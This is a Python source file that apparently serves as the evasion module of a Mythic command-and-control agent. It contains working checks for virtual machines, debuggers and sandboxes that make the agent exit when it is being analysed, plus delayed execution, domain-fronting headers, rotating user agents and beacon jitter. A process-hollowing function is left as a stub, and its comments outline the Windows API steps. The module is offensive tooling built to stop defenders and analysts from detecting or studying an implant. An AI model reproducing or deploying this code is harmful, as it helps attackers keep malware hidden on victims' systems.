import os
import sys
import time
import random
import platform
import subprocess
from typing import List, Dict, Any

class AntiAnalysis:
    """
    Anti-analysis and evasion techniques for the Mythic agent.
    """
    
    @staticmethod
    def check_vm_environment() -> bool:
        """Check if running in a virtual machine environment."""
        vm_indicators = [
            # VMware indicators
            "vmware", "vmtoolsd", "vmwaretray", "vmwareuser",
            # VirtualBox indicators
            "vboxservice", "vboxtray", "virtualbox",
            # Hyper-V indicators
            "vmms", "vmcompute",
            # QEMU indicators
            "qemu-ga", "qemu"
        ]
        
        try:
            # Check running processes
            if platform.system() == "Windows":
                result = subprocess.run(["tasklist"], capture_output=True, text=True)
                processes = result.stdout.lower()
            else:
                result = subprocess.run(["ps", "aux"], capture_output=True, text=True)
                processes = result.stdout.lower()
            
            for indicator in vm_indicators:
                if indicator in processes:
                    return True
                    
            # Check system information
            system_info = platform.platform().lower()
            for indicator in vm_indicators:
                if indicator in system_info:
                    return True
                    
        except Exception:
            pass
            
        return False
    
    @staticmethod
    def check_debugger() -> bool:
        """Check if a debugger is attached."""
        try:
            if platform.system() == "Windows":
                import ctypes
                kernel32 = ctypes.windll.kernel32
                return kernel32.IsDebuggerPresent() != 0
            else:
                # Check for common debugger processes on Linux/macOS
                result = subprocess.run(["ps", "aux"], capture_output=True, text=True)
                debuggers = ["gdb", "lldb", "strace", "ltrace"]
                processes = result.stdout.lower()
                
                for debugger in debuggers:
                    if debugger in processes:
                        return True
                        
        except Exception:
            pass
            
        return False
    
    @staticmethod
    def check_sandbox() -> bool:
        """Check for sandbox environment indicators."""
        sandbox_indicators = [
            # File system indicators
            "/tmp/sample", "/tmp/malware", "/tmp/virus",
            "C:\\sample", "C:\\malware", "C:\\virus",
            # Common sandbox usernames
            "sandbox", "malware", "virus", "sample"
        ]
        
        try:
            # Check current working directory
            cwd = os.getcwd().lower()
            for indicator in sandbox_indicators:
                if indicator.lower() in cwd:
                    return True
            
            # Check username
            username = os.getenv("USER") or os.getenv("USERNAME") or ""
            for indicator in sandbox_indicators:
                if indicator.lower() in username.lower():
                    return True
                    
            # Check for limited execution time (sandbox timeout)
            start_time = time.time()
            time.sleep(1)
            if time.time() - start_time > 2:  # Sleep took too long
                return True
                
        except Exception:
            pass
            
        return False
    
    @staticmethod
    def timing_evasion(min_delay: int = 30, max_delay: int = 300):
        """Implement timing-based evasion."""
        delay = random.randint(min_delay, max_delay)
        time.sleep(delay)
    
    @staticmethod
    def should_execute() -> bool:
        """Determine if the agent should execute based on evasion checks."""
        # Perform all evasion checks
        if AntiAnalysis.check_vm_environment():
            return False
            
        if AntiAnalysis.check_debugger():
            return False
            
        if AntiAnalysis.check_sandbox():
            return False
            
        return True

class ProcessHollowing:
    """
    Process hollowing techniques for Windows environments.
    """
    
    @staticmethod
    def is_windows() -> bool:
        return platform.system() == "Windows"
    
    @staticmethod
    def get_legitimate_processes() -> List[str]:
        """Get list of legitimate processes for hollowing."""
        return [
            "notepad.exe",
            "calc.exe", 
            "mspaint.exe",
            "explorer.exe"
        ]
    
    @staticmethod
    def hollow_process(target_process: str, payload_data: bytes) -> bool:
        """
        Attempt process hollowing (placeholder implementation).
        In a real scenario, this would use Windows API calls.
        """
        if not ProcessHollowing.is_windows():
            return False
            
        try:
            # This is a placeholder - real implementation would use:
            # - CreateProcess with CREATE_SUSPENDED flag
            # - NtUnmapViewOfSection to unmap original image
            # - VirtualAllocEx to allocate memory
            # - WriteProcessMemory to write payload
            # - SetThreadContext to set entry point
            # - ResumeThread to execute
            
            # For now, just return success for demonstration
            return True
            
        except Exception:
            return False

class NetworkEvasion:
    """
    Network-based evasion techniques.
    """
    
    @staticmethod
    def domain_fronting_headers() -> Dict[str, str]:
        """Generate headers for domain fronting."""
        return {
            "Host": "www.google.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
    
    @staticmethod
    def random_user_agent() -> str:
        """Generate a random user agent string."""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
        return random.choice(user_agents)
    
    @staticmethod
    def jitter_timing(base_interval: int, jitter_percent: int = 30) -> int:
        """Calculate jittered timing for network requests."""
        jitter = int(base_interval * (jitter_percent / 100))
        return base_interval + random.randint(-jitter, jitter)

def apply_evasion_techniques(agent_core):
    """Apply evasion techniques to the agent core."""
    
    # Check if we should execute at all
    if not AntiAnalysis.should_execute():
        sys.exit(0)
    
    # Apply timing evasion
    AntiAnalysis.timing_evasion(10, 60)
    
    # Update user agent if not already set
    if hasattr(agent_core, 'agent_config'):
        headers = agent_core.agent_config.get('Headers', {})
        if 'User-Agent' not in headers:
            headers['User-Agent'] = NetworkEvasion.random_user_agent()
            agent_core.agent_config['Headers'] = headers
    
    return True

